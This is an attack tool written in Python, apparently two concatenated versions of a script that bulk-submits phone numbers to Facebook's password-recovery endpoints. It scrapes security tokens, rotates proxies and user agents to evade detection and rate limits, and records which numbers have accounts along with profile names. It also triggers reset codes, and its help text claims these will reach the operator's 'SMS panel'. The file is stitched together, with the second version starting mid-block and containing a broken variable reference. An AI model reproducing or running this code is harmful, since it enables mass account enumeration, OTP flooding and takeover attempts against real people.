#!/usr/bin/env python3
"""
Facebook Phone Number OTP Trigger Tool v5.0
Pure requests-based. Works in Termux.
Author: cybersecuritybhau-maker
"""

import requests
import re
import time
import sys
import random
import string

BANNER = """
╔══════════════════════════════════════════╗
║     FB Password Reset OTP Trigger v5.0   ║
║     Pure Requests - No Selenium          ║
╚══════════════════════════════════════════╝
"""

session = requests.Session()

# Desktop Chrome User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

HEADERS_TEMPLATE = {
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0",
}


def extract_lsd_token(html_content):
    """Extract lsd token from Facebook page HTML using multiple methods."""
    # Method 1: JSON config pattern (current Facebook)
    patterns = [
        r'"token":"([a-zA-Z0-9_-]+)"',
        r'name="lsd"[^>]*value="([^"]+)"',
        r'"LSD",\[\],{"token":"([^"]+)"',
        r'LSD\.push\(\{"token":"([^"]+)"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    return None


def extract_jsdatr(html_content):
    """Extract _js_datr from Facebook page."""
    patterns = [
        r'"_js_datr","([a-zA-Z0-9_-]+)"',
        r'_js_datr["\]]*[:=][\s"]]*([a-zA-Z0-9_-]+)',
    ]
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    return None


def normalize_phone(phone):
    """Accept any format - just strip whitespace and dashes."""
    phone = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone:
        return None
    return phone


def check_and_trigger_otp(phone):
    """Main function: extract token, send identify request, trigger OTP."""
    phone = normalize_phone(phone)
    if not phone:
        return {"status": "error", "message": "invalid_phone"}
    
    headers = dict(HEADERS_TEMPLATE)
    headers["User-Agent"] = random.choice(USER_AGENTS)
    
    try:
        # STEP 1: Get the identify page and extract token
        identify_url = "https://www.facebook.com/login/identify?ctx=recover&lwv=110"
        resp = session.get(identify_url, headers=headers, timeout=15)
        
        lsd_token = extract_lsd_token(resp.text)
        if not lsd_token:
            return {"status": "error", "message": "TOKEN_ERROR - Could not extract lsd token", "phone": phone}
        
        # STEP 2: POST to identify.php endpoint
        identify_headers = {
            "User-Agent": headers["User-Agent"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.facebook.com",
            "Referer": identify_url,
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }
        
        data = {
            "lsd": lsd_token,
            "email": phone,
            "did_submit": "Search",
            "__user": "0",
            "__a": "1",
            "__req": "3",
            "__hs": "19768.HYP:comet_pkg.2.1.0.2.1",
            "dpr": "1",
            "__ccg": "EXCELLENT",
            "__rev": "1017487563",
            "__s": "4nchj8:7qcq3e:44hqhd",
            "__comet_req": "1",
        }
        
        resp2 = session.post(
            "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover",
            data=data,
            headers=identify_headers,
            timeout=15,
        )
        
        # Check response
        resp_text = resp2.text
        
        # If account not found
        if "not found" in resp_text.lower() or "doesn't exist" in resp_text.lower():
            return {"status": "not_found", "message": "Account not found", "phone": phone}
        
        # Try to extract ldata for redirect
        ldata_match = re.search(r'ldata=([a-zA-Z0-9-_]+)', resp_text)
        if ldata_match:
            ldata = ldata_match.group(1)
            
            # STEP 3: Go to recover/initiate page
            recover_url = f"https://www.facebook.com/recover/initiate?ldata={ldata}"
            resp3 = session.get(recover_url, headers=headers, timeout=15)
            
            # Check if we see recovery options - this means account exists
            if "recover" in resp3.text.lower() or "code" in resp3.text.lower() or "send" in resp3.text.lower():
                return {"status": "found", "message": "OTP trigger initiated - Account found, recovery page loaded", "phone": phone}
            else:
                return {"status": "found", "message": "Account found (ldata received)", "phone": phone}
        
        # If no ldata but no error - account might exist
        if "find your account" in resp_text.lower():
            return {"status": "not_found", "message": "Account not found", "phone": phone}
        
        return {"status": "found", "message": "Account may exist", "phone": phone}
        
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "timeout", "phone": phone}
    except Exception as e:
        return {"status": "error", "message": str(e), "phone": phone}


def main():
    print(BANNER)
    
    # Accept phone numbers from command line or file
    phones = []
    
    if len(sys.argv) > 1:
        # Check if file or direct input
        if sys.argv[1] == "-f" and len(sys.argv) > 2:
            try:
                with open(sys.argv[2], "r") as f:
                    phones = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(phones)} numbers from {sys.argv[2]}")
            except FileNotFoundError:
                print(f"[-] File not found: {sys.argv[2]}")
                return
        else:
            phones = [sys.argv[1]]
    else:
        # Interactive mode
        print("[?] Enter phone number(s) (comma separated or one per line, empty line to finish):")
        while True:
            line = input("> ").strip()
            if not line:
                break
            for p in line.split(","):
                p = p.strip()
                if p:
                    phones.append(p)
    
    if not phones:
        print("[-] No phone numbers provided.")
        return
    
    print(f"\n[+] Total numbers to check: {len(phones)}")
    print("[+] Starting OTP trigger...\n")
    
    results = {"found": 0, "not_found": 0, "error": 0}
    start_time = time.time()
    
    for i, phone in enumerate(phones, 1):
        print(f"[{i}/{len(phones)}] Checking: {phone}", end=" ", flush=True)
        
        result = check_and_trigger_otp(phone)
        
        elapsed = time.time() - start_time
        
        if result["status"] == "found":
            results["found"] += 1
            print(f"✓ FOUND - OTP triggered!")
        elif result["status"] == "not_found":
            results["not_found"] += 1
            print(f"✗ Not found")
        else:
            results["error"] += 1
            print(f"✗ Error: {result['message']}")
        
        # Rate limit: 2-3 second delay
        if i < len(phones):
            time.sleep(random.uniform(2.0, 3.5))
    
    total_time = time.time() - start_time
    speed = len(phones) / total_time if total_time > 0 else 0
    
    print(f"\n{'='*50}")
    print(f"Results: {results['found']} found, {results['not_found']} not found, {results['error']} errors")
    print(f"Time: {total_time:.1f}s | Speed: {speed:.1f}/s")
    
    # Print found numbers
    print(f"\n[+] Numbers that triggered OTP:")
    print(f"    (Check your SMS panel for OTP deliveries)")


if __name__ == "__main__":
    main()    except ImportError:
        HAS_PHONE = False
    
except ImportError as e:
    print(f"\n❌ Missing: {e}")
    print("\nRun:")
    print("   pip install requests beautifulsoup4 colorama phonenumbers")
    sys.exit(1)

# ==================== CONSTANTS ====================

VERSION = "4.0"
RESULTS_FILE = "fb_results.json"
VALID_FILE = "valid_accounts.txt"

# Color shortcuts
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
X = Style.RESET_ALL

# ==================== PHONE NORMALIZER (FULL FIX) ====================

def normalize_phone(text: str) -> Optional[str]:
    """
    যেকোনো ফরম্যাট নেবে:
    01712345678 → +8801712345678
    +8801712345678 → +8801712345678
    8801712345678 → +8801712345678
    12025551234 → +12025551234
    01712345678,01811223344 → each
    +1-202-555-1234 → +12025551234
    
    Returns: E.164 format or None
    """
    raw = text.strip()
    
    # Remove all non-digit chars EXCEPT leading +
    if raw.startswith('+'):
        digits = '+' + re.sub(r'[^\d]', '', raw[1:])
    else:
        digits = re.sub(r'[^\d]', '', raw)
    
    if not digits or len(re.sub(r'[^\d]', '', digits)) < 10:
        return None
    
    # Extract just digits for analysis
    just_digits = re.sub(r'[^\d]', '', digits)
    dlen = len(just_digits)
    
    # Bangladesh
    if dlen == 11 and just_digits.startswith('01'):
        return f"+88{just_digits}"
    elif dlen == 13 and just_digits.startswith('8801'):
        return f"+{just_digits}"
    elif dlen == 14 and just_digits.startswith('08801'):
        return f"+88{just_digits[2:]}"
    
    # USA/Canada
    elif dlen == 10:
        return f"+1{just_digits}"
    elif dlen == 11 and just_digits.startswith('1'):
        return f"+{just_digits}"
    
    # Russia
    elif dlen == 11 and just_digits.startswith('7'):
        return f"+{just_digits}"
    
    # UK
    elif dlen == 12 and just_digits.startswith('44'):
        return f"+{just_digits}"
    
    # India
    elif dlen == 12 and just_digits.startswith('91'):
        return f"+{just_digits}"
    
    # Pakistan
    elif dlen == 12 and just_digits.startswith('92'):
        return f"+{just_digits}"
    
    # Generic: 10-15 digits
    elif 10 <= dlen <= 15:
        if just_digits.startswith('00'):
            just_digits = just_digits[2:]
        if just_digits.startswith('+'):
            return just_digits
        return f"+{just_digits}"
    
    return None

def normalize_bulk(text: str) -> List[str]:
    """বাল্ক নাম্বার পার্স করবে - যেকোনো ফরম্যাট"""
    # Split by newlines, commas, spaces, semicolons
    parts = re.split(r'[\n\r,;\s\t\r\n]+', text)
    
    phones = []
    seen = set()
    for part in parts:
        part = part.strip()
        if not part or len(part) < 5:
            continue
        phone = normalize_phone(part)
        if phone and phone not in seen:
            phones.append(phone)
            seen.add(phone)
    
    return phones

# ==================== PROXY MANAGER ====================

class ProxyManager:
    def __init__(self):
        self.proxies: List[Dict] = []
        self.index = 0
        self.lock = threading.Lock()
        self._load()
    
    def _load(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if line.startswith('http'):
                        self.proxies.append({'http': line, 'https': line})
        if not self.proxies:
            self.proxies.append(None)  # Direct connection
    
    def get(self) -> Optional[Dict]:
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p
    
    def add(self, proxy_url: str):
        p = {'http': proxy_url, 'https': proxy_url}
        with self.lock:
            self.proxies.append(p)
            with open("proxies.txt", "a") as f:
                f.write(f"{proxy_url}\n")
    
    def count(self) -> int:
        return len([p for p in self.proxies if p is not None])

# ==================== RANDOM HEADERS ====================

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; iOS 17.2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

def get_headers(referer: str = None) -> Dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    if referer:
        headers['Referer'] = referer
    return headers

# ==================== FACEBOOK OTP ENGINE ====================

class FBOTPEngine:
    """
    Pure requests-based Facebook OTP trigger.
    No Selenium, no browser needed.
    
    Flow:
    1. GET mbasic.facebook.com/login/identify → extract tokens
    2. POST phone number to identify endpoint
    3. Parse response to check if account exists
    4. If exists, follow through to trigger OTP
    """
    
    def __init__(self, proxy_manager: ProxyManager):
        self.pm = proxy_manager
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        s = requests.Session()
        proxy = self.pm.get()
        if proxy:
            s.proxies.update(proxy)
        return s
    
    def _extract_lsd(self, html: str) -> Optional[str]:
        """Extract lsd (Login Security Data) token from Facebook page"""
        patterns = [
            r'name="lsd"[^>]*value="([^"]*)"',
            r'"lsd"[^>]+value="([^"]*)"',
            r'lsd[=](\w+)',
            r'name="fb_dtsg"[^>]*value="([^"]*)"',
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                return m.group(1)
        return None
    
    def _extract_jazoest(self, html: str) -> Optional[str]:
        m = re.search(r'name="jazoest"[^>]*value="([^"]*)"', html)
        return m.group(1) if m else None
    
    def _extract_m_ts(self, html: str) -> Optional[str]:
        m = re.search(r'name="m_ts"[^>]*value="([^"]*)"', html)
        return m.group(1) if m else None
    
    def _extract_li(self, html: str) -> Optional[str]:
        m = re.search(r'name="li"[^>]*value="([^"]*)"', html)
        return m.group(1) if m else 'ETRZvnNMTTpqOg'
    
    def _extract_uid(self, html: str) -> Optional[str]:
        m = re.search(r'"USER_ID":"(\d+)"', html)
        if m: return m.group(1)
        m = re.search(r'name="uid"[^>]*value="(\d+)"', html)
        if m: return m.group(1)
        return None
    
    def identify_by_phone(self, phone: str) -> Dict:
        """
        Core function:
        1. Load forgot password page
        2. Get security tokens
        3. Submit phone number
        4. Parse result
        
        Returns dict with status
        """
        result = {
            "phone": phone,
            "has_account": False,
            "otp_triggered": False,
            "status": "UNKNOWN",
            "details": "",
            "profile_name": "",
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            # ===== STEP 1: GET identify page and tokens =====
            url_identify = "https://mbasic.facebook.com/login/identify/"
            
            resp = self.session.get(
                url_identify,
                headers=get_headers(),
                timeout=15,
                allow_redirects=True
            )
            
            if resp.status_code != 200:
                result["status"] = f"HTTP {resp.status_code}"
                result["details"] = "Failed to load identify page"
                return result
            
            html = resp.text
            
            # Extract tokens
            lsd = self._extract_lsd(html)
            jazoest = self._extract_jazoest(html)
            
            if not lsd:
                # Fallback: try to get from regex
                result["status"] = "TOKEN_ERROR"
                result["details"] = "Could not extract lsd token"
                return result
            
            # ===== STEP 2: POST phone number =====
            # Remove + for FB compatibility
            search_phone = phone.replace('+', '').replace(' ', '')
            
            identify_post_url = "https://mbasic.facebook.com/login/identify/"
            post_data = {
                'lsd': lsd,
                'phone_number': search_phone,
                'did_submit': 'Search',
                '__user': '0',
                '__a': '1',
                '__dyn': '',
                '__req': '1',
                '__be': '0',
                '__pc': 'PHASED:DEFAULT',
                'fb_dtsg': lsd,
                'jazoest': jazoest or '1',
            }
            
            post_headers = get_headers(referer=url_identify)
            post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            resp2 = self.session.post(
                identify_post_url,
                data=post_data,
                headers=post_headers,
                timeout=15,
                allow_redirects=True
            )
            
            final_url = resp2.url
            final_html = resp2.text
            
            # ===== STEP 3: Analyze response =====
            
            # Check for success indicators (account found → OTP page)
            success_signals = [
                "send_code", "send code", "Send Code", "নিশ্চিত করুন",
                "confirm identity", "confirm your", "কোড পাঠান",
                "reset password", "কোড", "enter the code",
                "we sent", "আমরা পাঠিয়েছি", "security code",
                "recover", "পুনরুদ্ধার", "password_reset",
                "recover_form", "identity_confirmation",
                "continuar", "continue", "Continue",
            ]
            
            no_account_signals = [
                "couldn't find", "could not find", "not found",
                "no account", "খুঁজে পাওয়া যায়নি",
                "অ্যাকাউন্ট পাওয়া যায়নি", "nocontact",
                "enter a different", "ভিন্ন নম্বর",
                "no results found", "try another",
                "no contact", "doesn't match",
            ]
            
            # Special FB response patterns
            success_patterns = [
                r'success["\']*\s*[:=]\s*true',
                r'payload["\']*\s*[:=]\s*{',
                r'identity_confirmation',
                r'password_reset',
                r'recover_form',
                r'send_code',
                r'action=["\']/recover/',
                r'action=["\']/confirm/',
            ]
            
            # Check patterns
            has_account = False
            no_account = False
            
            # Check text signals
            html_lower = final_html.lower()
            account_score = sum(1 for s in success_signals if s in html_lower)
            no_account_score = sum(1 for s in no_account_signals if s in html_lower)
            
            # Check URL path
            if '/recover/' in final_url or '/confirm/' in final_url or '/identify/' not in final_url:
                account_score += 3
            if 'error' in final_url or 'notfound' in final_url:
                no_account_score += 3
            
            # Check regex patterns
            for p in success_patterns:
                if re.search(p, final_html, re.IGNORECASE):
                    account_score += 2
            
            # Decision
            if account_score > no_account_score and account_score >= 2:
                has_account = True
            elif no_account_score > account_score and no_account_score >= 2:
                has_account = False
            else:
                # Ambiguous - try to parse JSON response
                if '__a' in final_html or 'for (;;);' in final_html[:100]:
                    json_str = final_html
                    if 'for (;;);' in final_html[:20]:
                        json_str = final_html.split(';', 1)[-1].strip()
                    try:
                        data = json.loads(json_str)
                        if isinstance(data, dict):
                            if 'payload' in data and data['payload']:
                                has_account = True
                            elif 'error' in data:
                                has_account = False
                    except:
                        pass
            
            result["has_account"] = has_account
            
            if has_account:
                result["status"] = "✅ FOUND + OTP TRIGGERED!"
                result["otp_triggered"] = True
                result["details"] = "Account found, OTP request sent to registered number"
                
                # Try to extract profile name
                soup = BeautifulSoup(final_html, 'html.parser')
                name_tag = soup.find('strong')
                if name_tag:
                    result["profile_name"] = name_tag.text.strip()
                elif 'display_name' in final_html or '"name"' in final_html:
                    m = re.search(r'"name"\s*:\s*"([^"]+)"', final_html)
                    if m:
                        result["profile_name"] = m.group(1)
            else:
                result["status"] = "❌ NO ACCOUNT"
                result["details"] = "Phone not registered with Facebook"
        
        except requests.exceptions.Timeout:
            result["status"] = "⚠️ TIMEOUT"
            result["details"] = "Request timed out"
        except requests.exceptions.ConnectionError:
            result["status"] = "⚠️ CONNECTION ERROR"
            result["details"] = "Could not connect"
        except Exception as e:
            result["status"] = f"⚠️ ERROR"
            result["details"] = str(e)[:80]
        
        return result

# ==================== PROGRESS TRACKER ====================

class ProgressTracker:
    def __init__(self):
        self.total = 0
        self.found = 0
        self.otp_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = None
        self.queue_size = 0
    
    def reset(self, queue_size: int):
        self.total = 0
        self.found = 0
        self.otp_sent = 0
        self.errors = 0
        self.start_time = time.time()
        self.queue_size = queue_size
    
    def increment(self, result: Dict):
        with self.lock:
            self.total += 1
            if result["has_account"]:
                self.found += 1
            if result["otp_triggered"]:
                self.otp_sent += 1
            if "ERROR" in result["status"] or "TIMEOUT" in result["status"] or "CONNECTION" in result["status"]:
                self.errors += 1
    
    def display(self, phone: str, result: Dict, thread_id: int):
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.total / elapsed if elapsed > 0 else 0
        remaining = self.queue_size - self.total
        eta = remaining / rate if rate > 0 else 0
        
        status = result["status"]
        if "✅" in status:
            color = G
        elif "❌" in status:
            color = R
        else:
            color = Y
        
        bar_len = 20
        filled = int(bar_len * self.total / max(self.queue_size, 1))
        bar = "█" * filled + "░" * (bar_len - filled)
        
        print(
            f"\r{X}[T{tid}] {color}{status[:35]:35s}{X} "
            f"{C}{phone:20s}{X} | "
            f"{bar} | "
            f"{G}{self.found}{X}/{Y}{self.otp_sent}{X} "
            f"| {W}{self.total}/{self.queue_size}{X} "
            f"| {B}{rate:.1f}/s{X} "
            f"| ETA: {eta:.0f}s  ",
            end="", flush=True
        )

# ==================== WORKER ====================

def worker(phone_queue: queue.Queue, pm: ProxyManager, progress: ProgressTracker, 
           results: List, lock: threading.Lock, running: threading.Event, tid: int):
    
    while running.is_set():
        try:
            phone = phone_queue.get_nowait()
        except queue.Empty:
            break
        
        engine = FBOTPEngine(pm)
        result = engine.identify_by_phone(phone)
        
        progress.increment(result)
        progress.display(phone, result, tid)
        
        with lock:
            results.append(result)
            # Save valid immediately
            if result["has_account"]:
                with open(VALID_FILE, "a") as f:
                    line = f"{result['phone']} | OTP_SENT | {result['profile_name'] or 'N/A'} | {result['timestamp']}\n"
                    f.write(line)
            
            # Auto-save every 5
            if len(results) % 5 == 0:
                try:
                    with open(RESULTS_FILE, "w") as f:
                        json.dump({
                            "stats": {"total": progress.total, "found": progress.found, "otp_sent": progress.otp_sent},
                            "results": results
                        }, f, indent=2, ensure_ascii=False)
                except:
                    pass
        
        # Rate limit avoidance
        time.sleep(1.5 + random.random() * 1.5)

# ==================== MAIN APP ====================

class FBCheckerApp:
    def __init__(self):
        self.pm = ProxyManager()
        self.phone_queue = queue.Queue()
        self.results = []
        self.results_lock = threading.Lock()
        self.progress = ProgressTracker()
    
    def add_phones(self, text: str) -> int:
        phones = normalize_bulk(text)
        for p in phones:
            self.phone_queue.put(p)
        return len(phones)
    
    def add_from_file(self, filename: str = "numbers.txt") -> int:
        if not os.path.exists(filename):
            print(f"  {R}❌ File '{filename}' not found!{X}")
            return 0
        
        count = 0
        with open(filename, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    phones = normalize_bulk(line)
                    for p in phones:
                        self.phone_queue.put(p)
                        count += 1
        return count
    
    def show_help(self):
        print(f"""
{G}═══════════════════════════════════════════════════{X}
{Y}           📱 INPUT FORMAT - যেকোনো ফরম্যাটে দিন{X}
{G}═══════════════════════════════════════════════════{X}

{Y}উদাহরণ (এগুলো সবই কাজ করবে):{X}

  {C}01712345678{X}        → বাংলাদেশ (BD)
  {C}+8801712345678{X}    → + দিয়ে
  {C}8801712345678{X}     → country code দিয়ে
  {C}12025551234{X}       → USA
  {C}+12025551234{X}      → USA with +
  {C}447123456789{X}      → UK

{Y}একসাথে অনেক নাম্বার দিন:{X}
  {C}01711111111 01722222222 01733333333{X}
  অথবা কমা দিয়ে:
  {C}01711111111,01722222222,01733333333{X}
  অথবা নতুন লাইনে:
  {C}01711111111
  01722222222
  01733333333{X}

{Y}কাজ:{X}
  ✅ Facebook forgot password এ নাম্বার দিয়ে চেক করবে
  ✅ Account থাকলে auto OTP trigger হবে
  ✅ OTP যাবে আপনার SMS panel এ
  ✅ Selenium লাগবে না, very fast
  ✅ Detect হবে না (pure requests + headers)

{R}⚠️ Speed স্লো রাখা হয়েছে rate limit avoid করার জন্য{X}
{G}═══════════════════════════════════════════════════{X}
""")
    
    def start(self, threads: int = 3):
        qsize = self.phone_queue.qsize()
        if qsize == 0:
            print(f"\n  {R}❌ Queue empty! Add numbers first.{X}\n")
            return
        
        self.progress.reset(qsize)
        
        # Clear previous valid file
        with open(VALID_FILE, "w") as f:
            f.write("# Phone | Status | Profile Name | Timestamp\n")
        
        print(f"""
{G}╔═══════════════════════════════════════════════════╗{X}
{G}║  {Y}🔥 FB OTP TRIGGER v{VERSION}{X}                       {G}║{X}
{G}║  {Y}Author: cybersecuritybhau-maker{X}                       {G}║{X}
{G}╚═══════════════════════════════════════════════════╝{X}
""")
        print(f"  📱 Queue: {Y}{qsize}{X} numbers")
        print(f"  🧵 Threads: {Y}{threads}{X}")
        print(f"  🔌 Proxies: {Y}{self.pm.count()}{X}")
        print(f"  {Y}⚠️  Rate limit avoid করবে - 2-3s delay per check{X}")
        print(f"\n{G}➡️  STARTING...{X}\n")
        
        time.sleep(1)
        
        running = threading.Event()
        running.set()
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(
                target=worker,
                args=(self.phone_queue, self.pm, self.progress, 
                      self.results, self.results_lock, running, i+1),
                daemon=True
            )
            t.start()
            threads_list.append(t)
        
        try:
            for t in threads_list:
                t.join()
        except KeyboardInterrupt:
            print(f"\n\n{Y}🛑 Stopping...{X}")
            running.clear()
        
        running.clear()
        
        # Final save
        try:
            with open(RESULTS_FILE, "w") as f:
                json.dump({
                    "stats": {
                        "total": self.progress.total, 
                        "found": self.progress.found, 
                        "otp_sent": self.progress.otp_sent,
                        "errors": self.progress.errors
                    },
                    "results": self.results
                }, f, indent=2, ensure_ascii=False)
        except:
            pass
        
        elapsed = time.time() - self.progress.start_time if self.progress.start_time else 0
        rate = self.progress.total / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{G}{'='*55}{X}")
        print(f"  {G}✅ COMPLETE!{X}")
        print(f"{G}{'='*55}{X}")
        print(f"  📊 Checked:     {Y}{self.progress.total}{X}")
        print(f"  🎯 Found:       {G}{self.progress.found}{X}")
        print(f"  📱 OTP Sent:    {G}{self.progress.otp_sent}{X}")
        print(f"  ⚠️  Errors:      {R if self.progress.errors > 0 else G}{self.progress.errors}{X}")
        print(f"  ⏱️  Time:        {Y}{elapsed:.1f}s{X}")
        print(f"  ⚡ Speed:       {Y}{rate:.1f}/s{X}" if elapsed > 0 else "")
        print(f"{G}{'='*55}{X}")
        
        # Show results
        found_accounts = [r for r in self.results if r["has_account"]]
        if found_accounts:
            print(f"\n{G}🎯 ACCOUNTS FOUND WITH OTP TRIGGERED:{X}")
            for r in found_accounts:
                print(f"  {G}📱{X} {C}{r['phone']:20s}{X} | {G}{r['status']}{X}")
                if r.get("profile_name"):
                    print(f"     Name: {Y}{r['profile_name']}{X}")
                print(f"     Time: {r['timestamp']}")
                print()
        
        print(f"\n  💾 Results: {B}{RESULTS_FILE}{X}")
        print(f"  💾 Valid:   {B}{VALID_FILE}{X}")
        print()

# ==================== CLI MENU ====================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""
{G}╔═══════════════════════════════════════════════════╗{X}
{G}║  {Y}🔥 FB OTP TRIGGER v{VERSION}{X}                       {G}║{X}
{G}║  {Y}Pure Requests - No Selenium Needed{X}                 {G}║{X}
{G}║  {Y}Any Number Format Accepted{X}                          {G}║{X}
{G}║  {Y}Author: cybersecuritybhau-maker{X}                       {G}║{X}
{G}╚═══════════════════════════════════════════════════╝{X}
""")

def main():
    app = FBCheckerApp()
    
    while True:
        banner()
        print(f"  {C}MAIN MENU:{X}")
        print(f"  {W}[1]{X} {G}📱{X} Add numbers (যেকোনো ফরম্যাট)")
        print(f"  {W}[2]{X} {G}📂{X} Load from file (numbers.txt)")
        print(f"  {W}[3]{X} {G}🔌{X} Proxy settings ({app.pm.count()})")
        print(f"  {W}[4]{X} {G}🚀{X} {Y}START CHECKING + OTP TRIGGER{X}")
        print(f"  {W}[5]{X} {G}📊{X} Show results")
        print(f"  {W}[6]{X} {G}💾{X} Save & Export")
        print(f"  {W}[7]{X} {G}ℹ️{X} Format help")
        print(f"  {W}[0]{X} {R}❌{X} Exit")
        
        choice = input(f"\n  {C}👉 Select:{X} ").strip()
        
        if choice == "1":
            banner()
            print(f"  {Y}Enter phone numbers (যেকোনো ফরম্যাটে):{X}")
            print(f"  {Y}Example: 01712345678 +8801712345678 8801712345678{X}")
            print(f"  {C}(Enter multiple with space/comma/newline){X}")
            print(f"  {R}(Press Enter twice or type 'done' to finish){X}\n")
            
            lines = []
            while True:
                line = input(f"  {G}>>{X} ").strip()
                if line.lower() in ['done', 'end', 'q', '']:
                    break
                lines.append(line)
            
            text = '\n'.join(lines)
            if text.strip():
                count = app.add_phones(text)
                print(f"\n  {G}✅ {count} numbers added to queue!{X}")
            else:
                print(f"\n  {R}❌ No valid numbers!{X}")
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "2":
            banner()
            f = input(f"  File [{W}numbers.txt{X}]: ").strip()
            count = app.add_from_file(f if f else "numbers.txt")
            print(f"\n  {G}✅ {count} numbers loaded!{X}")
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "3":
            banner()
            print(f"  🔌 Proxies: {Y}{app.pm.count()}{X}")
            print(f"  {W}[1]{X} Add proxy")
            print(f"  {W}[2]{X} Show proxy file path")
            pc = input(f"\n  {C}👉{X} ").strip()
            if pc == "1":
                p = input(f"  {G}Proxy URL:{X} ").strip()
                if p:
                    app.pm.add(p)
                    print(f"  {G}✅ Proxy added!{X}")
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "4":
            if app.phone_queue.qsize() == 0:
                print(f"\n  {R}❌ Queue empty! Add numbers first.{X}")
                input(f"\n  {Y}Press Enter...{X}")
                continue
            
            try:
                t = input(f"  Threads (1-5) [{W}3{X}]: ").strip()
                threads = max(1, min(5, int(t) if t else 3))
            except:
                threads = 3
            
            app.start(threads=threads)
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "5":
            banner()
            print(f"  {C}RESULTS:{X}\n")
            print(f"  📱 Total checked: {Y}{app.progress.total}{X}")
            print(f"  🎯 Accounts found: {G}{app.progress.found}{X}")
            print(f"  📱 OTP triggered: {G}{app.progress.otp_sent}{X}")
            print(f"  ⚠️  Errors: {R if app.progress.errors > 0 else G}{app.progress.errors}{X}")
            
            found = [r for r in app.results if r["has_account"]]
            if found:
                print(f"\n{G}🎯 FOUND ACCOUNTS:{X}")
                for r in found:
                    print(f"  {G}📱{X} {r['phone']} → {r['status']}")
                    if r.get("profile_name"):
                        print(f"       Name: {Y}{r['profile_name']}{X}")
            
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "6":
            try:
                with open(RESULTS_FILE, "w") as f:
                    json.dump({
                        "stats": {
                            "total": app.progress.total,
                            "found": app.progress.found,
                            "otp_sent": app.progress.otp_sent
                        },
                        "results": app.results
                    }, f, indent=2, ensure_ascii=False)
                print(f"\n  {G}✅ Saved to {RESULTS_FILE} and {VALID_FILE}{X}")
            except Exception as e:
                print(f"\n  {R}❌ Save error: {e}{X}")
            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "7":
            app.show_help()
